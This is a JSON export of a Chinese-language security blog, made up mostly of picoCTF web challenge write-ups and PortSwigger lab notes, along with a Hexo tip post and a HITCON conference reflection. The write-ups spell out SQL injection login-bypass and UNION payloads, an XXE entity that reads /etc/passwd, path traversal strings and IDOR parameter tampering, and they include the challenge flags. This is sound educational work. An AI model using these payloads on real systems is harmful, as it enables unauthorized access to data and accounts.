[{"title":"SQL Direct - writeup","date":"2024-07-29T15:35:00.000Z","date_formatted":{"ll":"Jul 29, 2024","L":"07/29/2024","MM-DD":"07-29"},"author":"plusC","updated":"2024-07-29T15:52:58.131Z","content":"題目\n\n解題過程\n首先先用 webshell 連上 PostgreSQL server\n\n然後它說可以打 help for help\n\n這邊可以看到有 SQL 跟 psql 指令的 help\n第一個想法是去看看都有哪些 table\n但我對 psql 不太熟，所以就去翻翻看 psql 的 help\n找到了! \\dt 指令就是列出所有 tables\n\n列出後發現只有一個叫做 flags 的 table\n\n非常可疑阿 這邊用 SQL 語法去把 flags table 中的資料都抓出來\n\n果然就成功找到 flag 了~(╯✧∇✧)╯\npicoCTF{L3arN_S0m3_5qL_t0d4Y_31fd14c0}\n","plink":"https://pluscat.me/SQL-Direct-writeup/"},{"title":"SQLiLite - writeup","date":"2024-07-28T14:46:00.000Z","date_formatted":{"ll":"Jul 28, 2024","L":"07/28/2024","MM-DD":"07-28"},"author":"plusC","updated":"2024-07-28T15:00:40.478Z","content":"題目\n\n解題過程\n\n帳密先隨意打\n輸入後發現它直接將 sql 語句印出來\n\n感覺就用一般的 payload 就可以登入了\n帳號可以不用填\n密碼：'or'1'='1'--\n就可以成功登入了\n\n它說 flag 藏在很明顯的地方\n所以看一下程式碼\n\n果然就成功找到 flag 啦~ฅ^•ﻌ•^ฅ\npicoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}\n","plink":"https://pluscat.me/SQLiLite-writeup/"},{"title":"More SQLi - writeup","date":"2024-07-26T15:35:00.000Z","date_formatted":{"ll":"Jul 26, 2024","L":"07/26/2024","MM-DD":"07-26"},"author":"plusC","updated":"2024-07-26T16:16:51.640Z","content":"題目\n\n解題過程\n首先看到登入畫面\n\n隨意輸入後可以看到它直接將 sql 語句印出來\n\n語句是先檢查密碼\n所以密碼直接試試看最經典的 payload：'or'1'='1'--\n帳號就隨便打\n就成功登入了\n登入看到有一個查詢的 table，這邊我卡了蠻久的\n\n後來就放棄去看提示啦\n\n提示寫說是 SQLite 有關的 injection\n所以就去查了一下 SQLite 的 cheatsheet\nSELECT name FROM sqlite_master WHERE type='table': 從 SQLite 資料庫中查詢所有 table 的名稱\nSELECT sql FROM sqlite_master WHERE type='table': 從 SQLite 資料庫中查詢所有 table 的創建語句\n就用 Union 的方式去搜尋看看\nUnion 需要符合兩個 select 的查詢欄位數量一樣，並且對應的欄位資料型態一樣或是兼容\n所以先觀察原本 table 的資料型態，第一個欄位 City 是 TEXT，第二個欄位 Address 也是 TEXT，第三個欄位 Phone 應該也是 TEXT\n設計的 payload：\nAlgiers' union SELECT name,sql,sql FROM sqlite_master WHERE type='table'; --\n查詢結果成功拿到所有的 tables 以及它們的架構：\n\n從這些 tables 中看到有一個 table 叫做 more_table，並且裡面有一個欄位叫做 flag\n感覺就是這個了!!!\n用跟剛才一樣的方式去設計 payload：\nAlgiers' union SELECT flag,flag,flag FROM more_table; --\n就成功拿到 flag 啦~\n\npicoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}\n參考資料\nhttps://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet\n","plink":"https://pluscat.me/More-SQLi-writeup/"},{"title":"SOAP - writeup","date":"2024-07-25T12:59:00.000Z","date_formatted":{"ll":"Jul 25, 2024","L":"07/25/2024","MM-DD":"07-25"},"author":"plusC","updated":"2024-07-26T16:18:38.797Z","content":"題目\n\n解題過程\n題目說因為網頁沒有做安全評估，問我們有沒有辦法拿到 /etc/passwd\n本來想說應該是 directory traversal\n結果好像不是\n想了一下沒有頭緒就看了提示：\n\n提示說是 XXE (XML external entity Injection)\n超出知識範圍了，去惡補一下zzz\n惡補完後回到網頁\n可以發現每個 Detail button 上面都有一個隱藏的 input\n\n把 input 的 hidden 刪掉後就可以看到原本隱藏的輸入框了\n\n從程式碼中同時也可以發現 Details button 其實也就是表單的 submit button\n將表單送出後用 Burp Suite 抓下來：\n123456789101112131415161718POST /data HTTP/1.1Host: saturn.picoctf.net:49566Content-Length: 61Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Content-Type: application/xmlAccept: */*Origin: http://saturn.picoctf.net:49566Referer: http://saturn.picoctf.net:49566/Accept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: keep-alive&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;data&gt;    &lt;ID&gt;1&lt;/ID&gt;  &lt;/data&gt;\n可以看到表單內容是用 XML 格式送出\n所以把請求新增自定義的 Entity 去將本機的密碼輸出\n&lt;!DOCTYPE xxe [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;：定義了一個名為 xxe 的外部實體，指向本地文件系統的 /etc/passwd 文件\n&lt;data&gt; &lt;ID&gt;&amp;xxe;&lt;/ID&gt; &lt;/data&gt;：根元素 &lt;data&gt; 包含子元素 &lt;ID&gt;，其中引用了 &amp;xxe; 實體\n如果伺服器使用的 XML 解析器允許外部實體解析，那麼 &amp;xxe; 實體將會被替換成 /etc/passwd 文件的內容\n123456789101112131415161718POST /data HTTP/1.1Host: saturn.picoctf.net:49566Content-Length: 131Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Content-Type: application/xmlAccept: */*Origin: http://saturn.picoctf.net:49566Referer: http://saturn.picoctf.net:49566/Accept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: keep-alive&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;data&gt;&lt;ID&gt;&amp;xxe;&lt;/ID&gt;&lt;/data&gt;\n就可以成功拿到 flag 啦：\n12345678910111213141516171819202122232425262728HTTP/1.1 200 OKServer: Werkzeug/2.3.6 Python/3.8.10Date: Thu, 25 Jul 2024 13:23:45 GMTContent-Type: text/html; charset=utf-8Content-Length: 1023Connection: closeInvalid ID: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinflask:x:999:999::/app:/bin/shpicoctf:x:1001:picoCTF&#123;XML_3xtern@l_3nt1t1ty_0e13660d&#125;\npicoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}\n參考資料\nhttps://www.digicentre.com.tw/industry_detail?id=38\n","plink":"https://pluscat.me/SOAP-writeup/"},{"title":"Bookmarklet - writeup","date":"2024-07-24T12:32:00.000Z","date_formatted":{"ll":"Jul 24, 2024","L":"07/24/2024","MM-DD":"07-24"},"author":"plusC","updated":"2024-07-26T16:20:43.846Z","content":"題目\n\n解題過程\n題目說可以把 flag 做成書籤印出來\n進到題目給的頁面後看到它說書籤就在文字框中\n\n看到書籤的內容是一個 JS 的 function\n功能看起來是把一個加密過的 flag 進行解密的動作然後印出來\n12345678910javascript:(function() &#123;\tvar encryptedFlag = &quot;àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓ¨ÍÕÄ¦í&quot;;    var key = &quot;picoctf&quot;;    var decryptedFlag = &quot;&quot;;    for (var i = 0; i &lt; encryptedFlag.length; i++) &#123;    \tdecryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);    &#125;    alert(decryptedFlag);&#125;)();    \n下意識就是把這段程式複製下來貼到 devtools 的 console 執行看看\n\n就可以看到 flag 跳出來了~d(`･∀･)b\n\npicoCTF{p@g3_turn3r_18d2fa20}\n","plink":"https://pluscat.me/Bookmarklet-writeup/"},{"title":"IntroToBurp - writeup","date":"2024-07-22T16:00:00.000Z","date_formatted":{"ll":"Jul 23, 2024","L":"07/23/2024","MM-DD":"07-23"},"author":"plusC","updated":"2024-07-26T16:19:40.089Z","content":"題目\n\n解題過程\n嗯…題目很簡潔有力\n好 那就直接跳到網頁去看看\n從題目可以得知會用到 Burp Suite，所以先開起來攔截封包\n\n填一填送出後的封包長這樣：\n\n好像沒什麼特別的，繼續看下去\n\n填 OTP 送出的封包：\n\n看完之後也沒什麼頭緒，所以看了一下提示\n\n看來是叫我們改請求\n試了很久後發現是要讓我們把 otp=XXX 那行刪掉\n但是!! 把文字刪掉後的空行不能刪掉才能收到回應\n就像下面\n原本的請求：\n12345678910111213141516POST /dashboard HTTP/1.1Host: titan.picoctf.net:58370Content-Length: 13Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://titan.picoctf.net:58370Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://titan.picoctf.net:58370/dashboardAccept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=.eJxNjMsOwiAUBf-FtQsuIlB_hlC4RGMLhEdIY_rvRWNSl-dkZt7EPutG7sR118mF2JK9rvGFYXxUAHA-3YybAK4UlFSWCvRWCCEp8pkpxSWw4fm2LDqYFc9UrOnTYAokHzOZUnrM7gd8kfSIAXVo64z5FFvB_J_aD8NBMlQ.Zp6DtA.eTARx6x3W0uXnlkI9gTaWUFDl48Connection: closeotp=rf3erdfe+\n刪掉後的請求：\n12345678910111213141516POST /dashboard HTTP/1.1Host: titan.picoctf.net:58370Content-Length: 0Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://titan.picoctf.net:58370Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://titan.picoctf.net:58370/dashboardAccept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=.eJxNjMsOwiAUBf-FtQsuIlB_hlC4RGMLhEdIY_rvRWNSl-dkZt7EPutG7sR118mF2JK9rvGFYXxUAHA-3YybAK4UlFSWCvRWCCEp8pkpxSWw4fm2LDqYFc9UrOnTYAokHzOZUnrM7gd8kfSIAXVo64z5FFvB_J_aD8NBMlQ.Zp6DtA.eTARx6x3W0uXnlkI9gTaWUFDl48Connection: close這行空行不能刪\n就可以成功收到有 flag 的 response 啦~\n\n覺得這個題目空行不能刪的設定有點繞〒.〒\n","plink":"https://pluscat.me/IntroToBurp-writeup/"},{"title":"Unminify - writeup","date":"2024-07-22T15:14:00.000Z","date_formatted":{"ll":"Jul 22, 2024","L":"07/22/2024","MM-DD":"07-22"},"author":"plusC","updated":"2024-07-22T15:26:14.919Z","content":"題目\n\n解題過程\n題目說它壓縮了程式碼\n嗯…沒什麼想法…\n打開網頁後看到它說 “如果正在閱讀本文，則表示您的瀏覽器已成功收到 flag”\n\n那就用 dev-tool 去看一下程式碼\n\n結果就看到 flag 包在一層又一層的程式當中~(//●⁰౪⁰●)//\npicoCTF{pr3tty_c0d3_51d374f0}\n","plink":"https://pluscat.me/Unminify-writeup/"},{"title":"WebDecode - writeup","date":"2024-07-21T11:27:00.000Z","date_formatted":{"ll":"Jul 21, 2024","L":"07/21/2024","MM-DD":"07-21"},"author":"plusC","updated":"2024-07-21T11:42:31.413Z","content":"題目\n\n解題過程\n開啟網頁後可以看到他叫我們繼續 navigate\n\n所以再翻翻看 nav bar 的其他網頁，其中可以看到這頁最可疑\n\n所以就打開 web inspector 看看，也就是檢查工具\n\n覺得 notify_true 的值好像怪怪的就拿去做 base64 解碼看看\n結果 Do-Re-Me-Sol (完了這個梗是不是太老\nflag 就拿到了 (・∀・)\npicoCTF{web_succ3ssfully_d3c0ded_283e62fe}\n","plink":"https://pluscat.me/WebDecode-writeup/"},{"title":"Access Control 學習筆記","date":"2024-02-19T08:14:00.000Z","date_formatted":{"ll":"Feb 19, 2024","L":"02/19/2024","MM-DD":"02-19"},"author":"plusC","updated":"2024-02-19T08:25:06.556Z","content":"網頁應用的 access control 仰賴於：\n\nauthentication\nsession 管理\n\n垂直提權：可以拿到無權存取的更高權限\ne.g. 拿到管理者權限\n用參數控制存取權\n有些應用程式在登入的時候確認使用者的存取權限並存在使用者可以控制的地方，例如：\n\n隱藏的字段\ncookie\n預設的查詢字串參數\n\n應用程式根據提交的值做出存取控制決策。例如：\n12https://insecure-website.com/login/home.jsp?admin=truehttps://insecure-website.com/login/home.jsp?role=1\n但這樣做是不安全的，因為使用者有機會可以修改值並存取到未授權的功能\n攻擊手法\n敏感的網頁可能會暴露在 robots.txt 中或是攻擊者可以用字典檔透過暴力法去找敏感網頁\n1https://insecure-website.com/robots.txt\n另外，網頁的 JavaScript 也有可能洩漏敏感網頁：\n12345678910&lt;script&gt;\tvar isAdmin = false;\tif (isAdmin) &#123;\t\t...\t\tvar adminPanelTag = document.createElement(&#x27;a&#x27;);\t\tadminPanelTag.setAttribute(&#x27;https://insecure-website.com/administrator-panel-yb556&#x27;);\t\tadminPanelTag.innerText = &#x27;Admin panel&#x27;;\t\t...\t&#125;&lt;/script&gt;\nLab: Unprotected admin functionality with unpredictable URL\n可以看到 script 藏在 body 中間：\n\n網址改成：\n1https://0a56009e030460bb822f100b00e200ff.web-security-academy.net/admin-eod8pa\n就可以成功拿到 admin panel 了~\nLab: User role controlled by request parameter\n一開始直接在網址後面加上 /admin 會跳出沒有權限的頁面\n依照題目的指示登入帳密：wiener:peter 後會發現多了一個 cookie，Name=Admin Value=false\n\n猜測是用這個變數來控制存取權\n把 Value 改成 true 之後就可以成功拿到 admin panel\n水平提權：可以存取其他相同權限使用者的資源\n攻擊手法\n假如使用者透過以下 URL 存取自己的帳戶頁面：\n1https://insecure-website.com/myaccount?id=123\n則將 id 參數值改成其他使用者的值，就有可能可以獲得其他使用者的帳戶頁面以及相關功能的存取權\n\n這是不安全的直接物件參考 (Insecure Direct Object Reference, IDOR) 漏洞的範例。當使用者控制參數值用於直接存取資源或功能時，就會出現此類漏洞。\n\n在某些應用中，可利用的參數沒有可預測的值。例如，應用程式可以使用全域唯一識別碼 (Globally Unique Identifiers, GUID) 來識別用戶，而不是遞增的數字。這可以防止攻擊者猜測或預測另一個使用者的識別碼。然而，屬於其他用戶的 GUID 可能會在應用程式中引用用戶的其他地方公開，例如用戶訊息或評論\nLab: User ID controlled by request parameter, with unpredictable user IDs\n先找到 carlos 的文章\n點下去後就可以發現網址中帶有 carlos 的 GUID ：\n1https://0af6004903087c62819720dd00aa00d8.web-security-academy.net/blogs?userId=96bffc69-9f2b-4590-9893-5954027a2f84\n回到登入頁面，送出題目提供的帳密後可以看到原本的 API Key\n再重刷頁面擷取 request：\n1234567891011121314151617GET /my-account?id=09425c50-807f-4d1b-b1c9-95ccc7fd65b5 HTTP/2Host: 0af6004903087c62819720dd00aa00d8.web-security-academy.netCookie: session=bJbuS3uECMf5BpR8Y6itMVDAtH6CAeB4Cache-Control: max-age=0Sec-Ch-Ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://0af6004903087c62819720dd00aa00d8.web-security-academy.net/loginAccept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7\n將 request 的 id 改成 carlos 的 GUID 後就可以拿到他的 API Key 了\n水平到垂直的提權\n透過損害更有特權的用戶，水平權限升級攻擊可以轉變為垂直權限升級\n例如，水平升級可能允許攻擊者重設或捕獲屬於另一個使用者的密碼，如果攻擊者以管理使用者為目標並危害其帳戶，那麼他們可以獲得管理存取權限，從而執行垂直權限升級\nLab: User ID controlled by request parameter with password disclosure\n先使用題目提供的帳密登入\n擷取到 request：\n1234567891011121314151617GET /my-account?id=wiener HTTP/2Host: 0a5500290397ee35812f61e400580034.web-security-academy.netCookie: session=9JVap7la6eU0aaaYa21JjEV47cvBon1ECache-Control: max-age=0Sec-Ch-Ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://0a5500290397ee35812f61e400580034.web-security-academy.net/loginAccept-Encoding: gzip, deflate, brAccept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7\n把 id=wiener 改成 id=administrator 後送出\n從 response 中就可以拿到管理者的密碼 ambfil2by1q1e0u41mqz：\n1&lt;input required type=password name=password value=&#x27;ambfil2by1q1e0u41mqz&#x27;/&gt;\n重新登入管理者的帳密後就可以拿到 admin panel 了~\n參考資料\nhttps://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/access-control-apprentice/access-control/what-is-access-control\n","plink":"https://pluscat.me/Access-Control-學習筆記/"},{"title":"Path Traversal(Directory Traversal) 學習筆記","date":"2024-01-24T08:33:00.000Z","date_formatted":{"ll":"Jan 24, 2024","L":"01/24/2024","MM-DD":"01-24"},"author":"plusC","updated":"2024-01-24T08:41:21.147Z","content":"攻擊危害\n攻擊者可以讀取任意伺服器端的檔案，可能包含\n\n應用程式 code 跟 data\n後端憑證 (Credentials)\n敏感 OS 檔案\n\n假如還可以寫的話，就可以更改應用程式資料或行為，最終可能可以拿到伺服器的完整控制權\n攻擊手法\n讀取任意檔案\n假如今天網站上有一張圖片：\n1&lt;img src=&quot;/loadImage?filename=218.png&quot;&gt;\n這張圖片透過 filesystem API 去讀取 /var/www/images/218.png\n這樣的話攻擊者可以下列 URL 去讀取 /etc/passwd ：\n1https://insecure-website.com/loadImage?filename=../../../etc/passwd\n也就是讀取 /var/www/images/../../../etc/passwd 路徑\np.s. 在 Windows 中，../ 跟 ..\\ 都是合法的寫法，以下是針對基於 Windows 的伺服器的等效攻擊範例：\n1https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini\nLab\n實際用 Burp Suite 去抓網頁中 image 的請求：\n12GET /image?filename=13.jpg HTTP/2...\n並修改成：\n12GET /image?filename=../../../etc/passwd HTTP/2...\n回傳的內容就會是 /etc/passwd 檔案：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546HTTP/2 200 OKContent-Type: image/jpegX-Frame-Options: SAMEORIGINContent-Length: 2316root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinpeter:x:12001:12001::/home/peter:/bin/bashcarlos:x:12002:12002::/home/carlos:/bin/bashuser:x:12000:12000::/home/user:/bin/bashelmer:x:12099:12099::/home/elmer:/bin/bashacademy:x:10000:10000::/academy:/bin/bashmessagebus:x:101:101::/nonexistent:/usr/sbin/nologindnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinsystemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/falsepostgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashusbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologinmongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologinavahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologingeoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologinsaned:x:114:122::/var/lib/saned:/usr/sbin/nologincolord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinpulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologingdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false\n參考資料\nhttps://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/what-is-path-traversal\n","plink":"https://pluscat.me/Path-Traversal-學習筆記/"},{"title":"MatchTheRegex - writeup","date":"2023-11-30T06:26:00.000Z","date_formatted":{"ll":"Nov 30, 2023","L":"11/30/2023","MM-DD":"11-30"},"author":"plusC","updated":"2024-01-24T08:35:54.231Z","content":"題目\n\n解題過程\n開啟網頁可以看到要求要輸入 valid input\n\n打開網頁程式碼看看有甚麼資訊\n看到 script 中有一行註解寫著 // ^p.....F!?\n\n^p.....F!?:\n\n^p 在正規表示法裡代表字串以 p 開頭\n五個點代表的是任意五個字元\n五個字元後接著的是 F\n!? 在 “F” 之前可以有零個或一個 “!”\n\n但輸入 ^p.....F!? 卻還是顯示錯誤\n\n將開頭的 ^ 拿掉改成不用字串開頭，而是字串的任意位置 p.....F!?\n\n就可以成功拿到 flag 了 d(`･∀･)b\npicoCTF{succ3ssfully_matchtheregex_0694f25b}\n參考資料\nhttps://hackmd.io/@nabilmuafa/ryanc7Vg3\nhttps://atedev.wordpress.com/2007/11/23/正規表示式-regular-expression/\n","plink":"https://pluscat.me/MatchTheRegex-writeup/"},{"title":"findme - writeup","date":"2023-11-30T03:59:00.000Z","date_formatted":{"ll":"Nov 30, 2023","L":"11/30/2023","MM-DD":"11-30"},"author":"plusC","updated":"2024-01-24T08:35:34.790Z","content":"題目\n\n解題過程\n先按下 Launch Instance 後，就會出現 web 連結\n\n輸入題目要求的帳號: test 密碼: test!\n\n按下送出後用 Burp Suite 攔截\n發現有一個封包的字串看起來很可疑：\nGET /next-page/id=cGljb0NURntwcm94aWVzX2Fs\n\n把字串選起來就可以看到它是用 Base64 編碼的 flag\n\n但 flag 並不完整只有一半，所以繼續攔截封包\n就可以看到相似的封包\n\n一樣選起來解碼就可以拿到剩下的 flag 了 ٩(^ᴗ^)۶\n\npicoCTF{proxies_all_the_way_a0fe074f}\n參考資料\nhttps://medium.com/@f4b1o22/picoctf-2023-findme-write-up-41c8e20dcdde\nhttps://hackmd.io/@Awwwolf/BytPF1bfn\n","plink":"https://pluscat.me/findme-writeup/"},{"title":"在 Hexo 遇到的各種疑難雜症","date":"2023-08-27T05:57:29.000Z","date_formatted":{"ll":"Aug 27, 2023","L":"08/27/2023","MM-DD":"08-27"},"author":"plusC","updated":"2023-08-27T09:47:43.064Z","content":"由於第一次使用 Hexo 架站，然後又沒有仔細去看官方文件 &amp; 其他人的文章，所以就遇到一堆問題…\n如何更改他人寫好的模板\n在安裝好他人的模板下來後通常會想要改一些細節變得更客製化, 像是更改字體、背景顏色、dark mode 等等\n更改的位置通常是在 node_modules\\模板資料夾\\_config.yml 裡\n像我的就是在 node_modules\\hexo-theme-inside\\_config.yml,\n如下圖：\n\nBTW, 你想改的東西絕對不會放在 public 資料夾裡，因為 public 資料夾是編譯出來的檔案，可以被 clean 掉，也可以被 generate 出來\n更改文章(posts)內容\n文章通常會存在 source\\_posts (不是主題資料夾裡的 source，是專案資料夾下的 source)\n\n每一個 post 都是獨立的 markdown file，裡面就會放一些文章的資訊跟內容，像是 title, author, tags 等等，\n\n要修改文章內容的話也是從這邊下手，如果想要像寫 HackMD 一樣的話，可以去安裝 hexo plugin：hexo-admin\n一個文章多個 tags\n因為之前很少寫 markdown，這個也搜尋了一陣子才解決…\n123tags:- Hexo - 疑難雜證\n就可以得到多個 tags 啦~٩(⚙ᴗ⚙)۶\n","thumbnail":"https://i.imgur.com/s4Xzklx.jpeg","color":"#111","plink":"https://pluscat.me/在-Hexo-遇到的疑難雜症/"},{"title":"HITCON CMT 2023 心得","date":"2023-08-21T04:13:00.000Z","date_formatted":{"ll":"Aug 21, 2023","L":"08/21/2023","MM-DD":"08-21"},"author":"plusC","updated":"2024-01-24T08:41:47.855Z","content":"今年是第二次參加台灣駭客年會，並且成功申請學生票\n(前年不小心錯過申請時間所以買全票 好貴qq\n第一次參加\n還記得第一次參加的時候因為剛接觸這個領域，所以幾乎都聽不懂\n(不知道哪來的勇氣來參加，還買全票 (✖﹏✖)\n每聽完一場會議就喪氣一次，心裡一直想著我到底來這裡幹嘛…最後還提早走(超級浪費錢)\n再後來又因為實在跨不過進入資安的第一道門檻所以就放棄走這個領域了\n沒想到…研究所一個不小心又進入到專門做資安的 lab 了呢 (≧▽≦)\n有一種繞了一圈還是遇到了的感覺(是在拍偶像劇嗎\n第二次參加\n於是，原本決定絕對不再參加 HITCON 的我又再一次踏入這個神級會議\n這一次的我聽懂了蠻多的，雖然還不是百分之百\n但終於聽懂大神們那些酷酷的過程(通靈的部分還是不懂qq\n邊聽邊讚嘆 喔喔喔喔喔原來還可以這樣\n🍊\n來 HITCON 是一個大補血的過程\n雖然還是超級菜，但是看完每一場會議都會有一種更想要往前進的感覺\n這次最有感的會議是橘子大大的分享，他分享了三年 Pwn2Own 起起伏伏的過程\n第一次感受到大神遇到困境的心情以及他是如何克服的\n\n朝著對的方向堅持\n\n堅持很重要，找到對的方向堅持更重要\n\n其他分享\n這次有申請學生方案補助的住宿\nHITCON 提供的是壹零壹艾美琪旅店六星背包客旅店\n在外面看的時候超級不像可以踏進去的樣子\n但不要怕 勇敢上樓就可以看到美美的大廳\n\n\n可惜沒拍到房間的樣子，是四人房的女生宿舍\n還有提供電視(要自己帶耳機)\n住起來超級舒適，早上附近也有好吃早餐\n希望明年還是這一間(X\n","thumbnail":"https://i.imgur.com/sAMl5NW.jpeg","color":"#111","plink":"https://pluscat.me/HITCON2023-心得/"}]